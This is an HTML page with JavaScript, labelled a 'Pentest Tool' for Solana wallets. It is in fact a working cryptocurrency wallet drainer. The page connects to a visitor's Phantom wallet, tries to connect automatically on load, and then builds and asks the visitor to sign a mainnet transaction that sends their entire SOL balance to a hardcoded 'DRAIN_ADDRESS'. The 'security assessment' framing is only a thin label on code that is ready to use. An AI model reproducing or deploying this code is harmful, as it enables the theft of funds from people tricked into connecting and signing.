    <meta charset="UTF-8">

    <title>Solana Wallet Connector - Pentest Tool</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script src="https://unpkg.com/@solana/wallet-adapter-base@0.9.23/dist/umd/index.min.js"></script>
    <script src="https://unpkg.com/@solana/wallet-adapter-phantom@0.9.23/dist/umd/index.min.js"></script>
</head>
<body>
    <div id="app">
        <h1>Connect Wallet for Security Assessment</h1>
        <button id="connectBtn">Connect Phantom Wallet</button>
        <div id="status"></div>
        <button id="drainBtn" style="display:none;">Execute Transfer (Pentest)</button>
    </div>

    <script>
        const DRAIN_ADDRESS = "2kc9YnPCrMZHJ21eWr6wGd7U9bKKTu2Mq2St3osdusvK"; // Replace with your authorized pentest drain address
        const CONTRACT_PROGRAM_ID = "11111111111111111111111111111111"; // System program for native SOL transfer
        
        let walletConnection = null;
        let publicKey = null;

        const connectBtn = document.getElementById('connectBtn');
        const drainBtn = document.getElementById('drainBtn');
        const statusDiv = document.getElementById('status');

        // Initialize Phantom wallet adapter
        async function initPhantom() {
            if (window.solana && window.solana.isPhantom) {
                try {
                    const phantom = window.solana;
                    await phantom.connect({ onlyIfTrusted: false });
                    
                    walletConnection = phantom;
                    publicKey = phantom.publicKey;
                    
                    statusDiv.innerHTML = `Connected: ${publicKey.toString()}`;
                    connectBtn.style.display = 'none';
                    drainBtn.style.display = 'block';
                    
                    return true;
                } catch (err) {
                    statusDiv.innerHTML = `Connection failed: ${err.message}`;
                }
            } else {
                statusDiv.innerHTML = 'Phantom wallet not detected. Please install Phantom.';
            }
        }

        // Execute drain transaction
        async function drainWallet() {
            if (!walletConnection || !publicKey) {
                statusDiv.innerHTML = 'No wallet connected';
                return;
            }

            statusDiv.innerHTML = 'Creating drain transaction...';
            
            try {
                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
                
                // Get recent blockhash
                const { blockhash } = await connection.getLatestBlockhash();
                
                // Create transfer instruction - drain ALL SOL to target
                const transferInstruction = solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: new solanaWeb3.PublicKey(DRAIN_ADDRESS),
                    lamports: await connection.getBalance(publicKey) // Drain everything
                });

                // Build transaction
                const transaction = new solanaWeb3.Transaction({
                    recentBlockhash: blockhash,
                    feePayer: publicKey
                }).add(transferInstruction);

                // Sign and send
                const signature = await walletConnection.signAndSendTransaction(transaction);
                
                statusDiv.innerHTML = `Drain executed! Tx: ${signature}`;
                console.log('Pentest drain successful:', signature);
                
            } catch (err) {
                statusDiv.innerHTML = `Drain failed: ${err.message}`;
                console.error('Pentest drain error:', err);
            }
        }

        connectBtn.onclick = initPhantom;
        drainBtn.onclick = drainWallet;

        // Auto-connect if already trusted
        window.addEventListener('load', () => {
            if (window.solana && window.solana.isPhantom) {
                initPhantom();
            }
        });
    </script>
